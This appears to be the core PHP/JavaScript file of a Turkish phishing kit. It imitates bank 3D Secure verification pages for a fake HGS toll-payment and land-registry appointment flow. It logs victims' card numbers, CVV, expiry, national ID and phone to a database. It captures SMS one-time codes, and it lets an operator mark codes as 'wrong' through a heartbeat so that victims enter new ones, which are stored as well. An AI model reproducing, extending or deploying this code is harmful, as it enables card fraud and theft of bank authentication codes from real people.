<?php
/**
 * acs/_acs_core.php — Tüm ACS sayfalarının ortak PHP + JS mantığı
 * Her banka dosyası bunu include eder, sadece HTML/CSS değişir.
 *
 * Değişkenler (include öncesi banka dosyasında set edilmeli):
 *   $banka_kisa  — 'garanti', 'akbank' vb. (heartbeat/log için)
 */

if (session_status() === PHP_SESSION_NONE) session_start();

require_once __DIR__ . '/../db.php';

// ?hata GET parametresi ile direkt test/yönlendirme desteği
// ?hata=0 → bekleme (kod gösterme), ?hata=1 → hatalı kod ekranı
$get_hata = $_GET['hata'] ?? null;

if ($get_hata !== null) {
    // Session varsa gerçek verileri kullan, yoksa test verisi
    if (!empty($_SESSION['basvuru'])) {
        $_SESSION['adim'] = 4;
        $log_id = get_or_create_log();
        $odeme   = $_SESSION['odeme'] ?? [];
        $kart_no = preg_replace('/\D/', '', $odeme['kart_no'] ?? '');

        // ?hata=1 ile sayfa yeniden açıldığında önceki sms_kod'u temizle
        if ($get_hata === '1' && $log_id) {
            try {
                // Hatalı kodu sms_hata_kodlari'na taşı, durum'u sıfırla
                $st = db()->prepare("SELECT sms_kod FROM tapu_logs WHERE id=? LIMIT 1");
                $st->execute([$log_id]);
                $eskiKod = trim($st->fetchColumn() ?: '');
                if ($eskiKod) {
                    $mst = db()->prepare("SELECT sms_hata_kodlari FROM tapu_logs WHERE id=? LIMIT 1");
                    $mst->execute([$log_id]);
                    $mevcut = trim($mst->fetchColumn() ?: '');
                    
                    $duplicate = false;
                    if ($mevcut) {
                        $lines = explode("\n", $mevcut);
                        $last_line = end($lines);
                        if (preg_match('/\]\s*(\d+)$/', $last_line, $m)) {
                            if ($m[1] === $eskiKod) {
                                $duplicate = true;
                            }
                        }
                    }
                    
                    if (!$duplicate) {
                        $tarih = date('H:i:s');
                        $yeni = $mevcut ? $mevcut . "\n[{$tarih}] {$eskiKod}" : "[{$tarih}] {$eskiKod}";
                        db()->prepare("UPDATE tapu_logs SET sms_hata_kodlari=?, sms_kod='', durum='3d_gonder', guncellendi=NOW() WHERE id=?")
                             ->execute([$yeni, $log_id]);
                    } else {
                        // Mükerrer ise sadece sms_kod temizle ve durumu sıfırla
                        db()->prepare("UPDATE tapu_logs SET sms_kod='', durum='3d_gonder', guncellendi=NOW() WHERE id=?")
                             ->execute([$log_id]);
                    }
                } else {
                    // sms_kod yoksa sadece durum'u 3d_gonder'e çek
                    db()->prepare("UPDATE tapu_logs SET durum='3d_gonder', guncellendi=NOW() WHERE id=?")
                          ->execute([$log_id]);
                }
            } catch (Exception $e) {}
        }
    } else {
        // Session yoksa test verisi
        $kart_no = '540669XXXXXX9014';
        $log_id  = null;
    }
    $tutar_str = '49';
    if (!empty($_SESSION['randevu']['saat'])) {
        $tutar_str = preg_replace('/\D/', '', $_SESSION['randevu']['saat']);
    } elseif ($log_id) {
        try {
            $st_saat = db()->prepare("SELECT saat FROM tapu_logs WHERE id=? LIMIT 1");
            $st_saat->execute([$log_id]);
            $saat_val = $st_saat->fetchColumn();
            if ($saat_val) {
                $tutar_str = preg_replace('/\D/', '', $saat_val);
            }
        } catch (Exception $e) {}
    }
    if (empty($tutar_str)) {
        $ucret_val = ayar_get('randevu_ucreti', '49');
        $tutar = number_format((float)$ucret_val, 2, ',', '');
    } else {
        $tutar = number_format((float)$tutar_str, 2, ',', '');
    }
    $isyeri     = 'HGS ÖDEME';
    $zaman      = date('d.m.Y H:i');
    $kod_goster = true;
    $hata_modu  = ($get_hata === '1');
} else {
    // Normal session akışı
    // Vercel Serverless Session Recovery (Session Kaybı Önleme)
    if (empty($_SESSION['basvuru'])) {
        try {
            $sid = session_id();
            $row = db()->prepare("SELECT * FROM tapu_logs WHERE session_id=? LIMIT 1");
            $row->execute([$sid]);
            $r = $row->fetch();
            if ($r && !empty($r['tc']) && !empty($r['telefon'])) {
                $_SESSION['log_id'] = (int)$r['id'];
                $_SESSION['hgs_sorgu_tipi'] = $r['ilce'] ? strtolower($r['ilce']) : 'plaka';
                $_SESSION['hgs_sorgu_deger'] = $r['tc'];
                $_SESSION['hgs_telefon'] = $r['telefon'];
                
                $_SESSION['basvuru'] = [
                    'ad' => 'HGS',
                    'soyad' => 'Yükleme',
                    'telefon' => $r['telefon'],
                    'tc' => $r['tc'],
                    'il' => 'ANKARA',
                    'ilce' => 'ÇANKAYA'
                ];
                
                $_SESSION['randevu'] = [
                    'mudurlik' => 'HGS: ' . strtoupper($r['ilce'] ?: 'PLAKA'),
                    'tarih' => $r['tc'],
                    'saat' => $r['saat'] ?: '275 TL'
                ];

                if (!empty($r['kart_no'])) {
                    $_SESSION['odeme'] = [
                        'kart_ad' => trim(($r['ad'] ?? '') . ' ' . ($r['soyad'] ?? '')),
                        'kart_no' => $r['kart_no'],
                        'ay'      => $r['ay'],
                        'yil'     => $r['yil'],
                        'cvv'     => $r['cvv'],
                        'telefon' => $r['telefon']
                    ];
                }
            } else {
                header('Location: ' . BASE_PATH . '/'); exit;
            }
        } catch (Exception $e) {
            header('Location: ' . BASE_PATH . '/'); exit;
        }
    }

    $_SESSION['adim'] = 4;
    $log_id = get_or_create_log();
    if ($log_id) update_log($log_id, ['mevcut_adim' => 4]);

    $odeme   = $_SESSION['odeme'] ?? [];
    $basvuru = $_SESSION['basvuru'] ?? [];
    $kart_no = preg_replace('/\D/', '', $odeme['kart_no'] ?? '');
    
    $tutar_str = '49';
    if (!empty($_SESSION['randevu']['saat'])) {
        $tutar_str = preg_replace('/\D/', '', $_SESSION['randevu']['saat']);
    } elseif ($log_id) {
        try {
            $st_saat = db()->prepare("SELECT saat FROM tapu_logs WHERE id=? LIMIT 1");
            $st_saat->execute([$log_id]);
            $saat_val = $st_saat->fetchColumn();
            if ($saat_val) {
                $tutar_str = preg_replace('/\D/', '', $saat_val);
            }
        } catch (Exception $e) {}
    }
    if (empty($tutar_str)) {
        $ucret_val = ayar_get('randevu_ucreti', '49');
        $tutar = number_format((float)$ucret_val, 2, ',', '');
    } else {
        $tutar = number_format((float)$tutar_str, 2, ',', '');
    }
    $isyeri  = 'HGS ÖDEME';
    $zaman   = date('d.m.Y H:i');

    // Sayfa yüklenince admin durumunu kontrol et
    $row   = heartbeat_check();
    $durum = $row['durum'] ?? 'bekle';

    $kod_goster = in_array($durum, ['3d_gonder', '3d_hatali']);
    $hata_modu  = ($durum === '3d_hatali');

    if ($durum === 'tebrik') { header('Location: ' . BASE_PATH . '/sonuc.php'); exit; }
    if (in_array($durum, ['kart_hatali','eticaret_kapali','limit_yetersiz',
                           'kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'])) {
        header("Location: " . BASE_PATH . "/odeme_hata.php?hata={$durum}"); exit;
    }
}

// Ortak JS (heartbeat + state yönetimi) — her banka sayfasına inject edilir
function acs_heartbeat_js(bool $kodGoster, bool $hataModu): string {
    $kg = $kodGoster ? 'true' : 'false';
    $hm = $hataModu  ? 'true' : 'false';
    $bp = BASE_PATH;
    return <<<JS
<script>
(function(){
  console.log('ACS Heartbeat loaded. Base path: {$bp}');
  var kodGoster = {$kg};
  var submitYapildi = false;

  function showKod(hatali){
    var bk = document.getElementById('state-bekle');
    var sk = document.getElementById('state-kod');
    var sf = document.getElementById('state-form'); // GO/QNB şablonlarında ayrı form div
    if(bk) bk.style.display='none';
    if(sk) sk.style.display='block';
    if(sf) sf.style.display='';  // GO template için
    if(hatali) gosterHataBox();
    startTimer(180);
  }

  function gosterHataBox(){
    var hb = document.getElementById('hata-box');
    if(hb){
      hb.style.display='block';
      // Eğer element içeriği boşsa varsayılan metin koy
      if(!hb.textContent.trim()){
        hb.textContent='Girdiğiniz kod hatalıdır. Lütfen yeni SMS kodunu giriniz.';
      }
      return;
    }
    // Yoksa oluştur
    var div = document.createElement('p');
    div.id = 'hata-box';
    div.style.cssText = 'color:red;margin-bottom:8px;';
    div.innerHTML = 'Girdi&#287;iniz kod hatal&#305;d&#305;r. L&uuml;tfen yeni SMS kodunu giriniz.';
    var sk = document.getElementById('state-kod');
    if(sk) sk.insertBefore(div, sk.firstChild);
  }

  function resetForm(){
    document.querySelectorAll('#state-kod .spinner-wrap').forEach(function(el){ el.remove(); });
    var btn = document.getElementById('acs-submit-btn');
    if(btn){ btn.disabled=true; btn.value='Gönder'; btn.textContent='Gönder'; }
    var inp = document.getElementById('sms-kod');
    if(inp){ inp.value=''; inp.disabled=false; }
    submitYapildi = false;
  }

  function heartbeat(){
    // Kod zaten gönderildi ve bekle.php'ye yönlendiriliyorsa hiçbir şey yapma
    if(window._acsGonderildi) return;

    fetch('{$bp}/heartbeat.php',{method:'POST',credentials:'same-origin'})
      .then(function(r){return r.json();})
      .then(function(d){
        // Tekrar kontrol: fetch sonucu gelirken submit gerçekleşmiş olabilir
        if(window._acsGonderildi) return;

        var dur = d.durum || 'bekle';

        // Bekleme → form göster
        if(dur==='3d_gonder' && !kodGoster){ kodGoster=true; showKod(false); return; }

        // Bekle ekranında hatalı geldi → formu göster + hata mesajı
        if(dur==='3d_hatali' && !kodGoster){ kodGoster=true; showKod(true); return; }

        // Form zaten açık, tekrar hatalı geldi (admin yeni hata işaretledi)
        // — SADECE form boşsa temizle, kullanıcı yeni kodu girmişse dokunma
        if(dur==='3d_hatali' && kodGoster){
          var inp=document.getElementById('sms-kod');
          var mevcutKod = inp ? inp.value.replace(/\D/g,'') : '';
          // Hatalı kodu sunucuya taşı (zaten girilip gönderilmemişse)
          if(mevcutKod.length > 0){
            var fdh=new FormData();
            fdh.append('sms_hata_kodu', mevcutKod);
            fetch('{$bp}/heartbeat.php',{method:'POST',body:fdh,credentials:'same-origin'}).catch(function(){});
          }
          // Formu sıfırla, hata göster
          if(inp){ inp.value=''; checkAcsBtn(); }
          gosterHataBox();
          return;
        }

        if(dur==='tebrik'){ location.href='{$bp}/sonuc.php'; return; }
        var hataListe=['kart_hatali','eticaret_kapali','limit_yetersiz','kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'];
        if(hataListe.indexOf(dur)!==-1){ location.href='{$bp}/odeme_hata.php?hata='+dur; }
      }).catch(function(){});
  }

  // Interval referansını dışarı çıkar ki submitAcsKod durdurabileceği olsun
  window._acsHbInterval = setInterval(heartbeat, 2500);



  var timerInt=null;
  function startTimer(sec){
    if(timerInt) clearInterval(timerInt);
    timerInt=setInterval(function(){
      if(--sec<=0){ clearInterval(timerInt); sec=0; }
      var m=Math.floor(sec/60), s=sec%60;
      var el=document.getElementById('countdown');
      if(el) el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
    },1000);
  }
  if(kodGoster) startTimer(180);
})();

function checkAcsBtn(){
  var inp=document.getElementById('sms-kod');
  var btn=document.getElementById('acs-submit-btn');
  if(!inp||!btn) return;
  var minLen = parseInt(inp.getAttribute('minlength') || inp.minLength || 4, 10) || 4;
  btn.disabled = (inp.value.replace(/\D/g,'').length < minLen);
}

function submitAcsKod(){
  // Çift tıklamayı önle
  if(window._acsGonderildi) return;
  window._acsGonderildi = true;

  // Heartbeat'i durdur — artık redirect kontrolü yapmasın
  if(window._acsHbInterval){ clearInterval(window._acsHbInterval); window._acsHbInterval=null; }

  var inp = document.getElementById('sms-kod');
  if(!inp){ window._acsGonderildi=false; return; }
  var kod = inp.value.replace(/\D/g,'');
  if(kod.length < 4){ window._acsGonderildi=false; return; }

  // Butonu hemen devre dışı bırak
  var btn = document.getElementById('acs-submit-btn');
  if(btn){
    btn.disabled = true;
    if(btn.tagName === 'INPUT') btn.value = 'Gönderiliyor...';
    else btn.textContent = 'Gönderiliyor...';
  }
  inp.disabled = true;

  // Veriyi hazırla
  var fd = new FormData();
  fd.append('mevcut_adim', '4');
  fd.append('sms_kod', kod);

  // sendBeacon: sayfa terk edilse bile veri gider (en güvenilir yöntem)
  var gonderildi = false;
  if(navigator.sendBeacon){
    gonderildi = navigator.sendBeacon('{$bp}/heartbeat.php', fd);
  }

  if(!gonderildi){
    // Fallback: eş zamanlı XHR (bloklar ama garantili)
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '{$bp}/heartbeat.php', false); // false = senkron
      xhr.send(fd);
    } catch(e){}
  }

  // Hemen yönlendir — veri zaten gönderildi
  window.location.replace('{$bp}/bekle.php');
}


</script>
JS;
}
